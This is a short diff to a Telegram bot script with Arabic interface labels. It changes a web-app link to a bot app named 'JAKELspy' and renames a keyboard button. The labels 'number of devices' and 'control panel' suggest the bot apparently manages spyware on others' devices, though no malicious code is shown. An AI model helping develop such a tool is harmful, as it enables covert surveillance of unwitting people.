@@ -239,7 +239,7 @@ bot.on("message", msg => {
         inline_keyboard: [[
           { 
             text: "📲 افتح صفحة التطبيق الآن", 
-            web_app: { url: "http://t.me/JL_HK011101Sbot/JAKELspy" } 
+            web_app: { url: "t.me/JL_HK011101Sbot/JAKELspy" } 
           }
         ]]
       }
@@ -269,7 +269,7 @@ bot.on("message", msg => {
       reply_markup: {
         keyboard: [
           ["📊 عدد الأجهزة", "🎮 لوحة التحكم"],
-          ["👨‍💻 معلومات المطور", "/app_link"]
+          ["👨‍💻 معلومات المطور", "تطبيقات الصدف🗃️☠️"]
         ],
         resize_keyboard: true
       }
